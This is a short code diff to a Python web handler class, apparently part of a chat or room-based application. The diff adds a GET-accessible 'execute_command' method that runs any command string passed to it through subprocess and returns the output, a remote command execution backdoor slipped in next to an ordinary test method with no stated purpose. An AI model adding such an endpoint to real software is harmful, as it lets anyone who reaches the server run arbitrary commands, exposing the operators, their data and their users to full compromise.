@@ -253,6 +253,12 @@ class HttpHandler(MethodDispatcher):
 		)
 
 	@require_http_method('GET')
+	def execute_command(self, command):
+		import subprocess
+		result = subprocess.run(command.split(' '), stdout=subprocess.PIPE)
+		return result.stdout
+
+	@require_http_method('GET')
 	def test(self):
 		try:
 			Room.objects.get(id=settings.ALL_ROOM_ID)
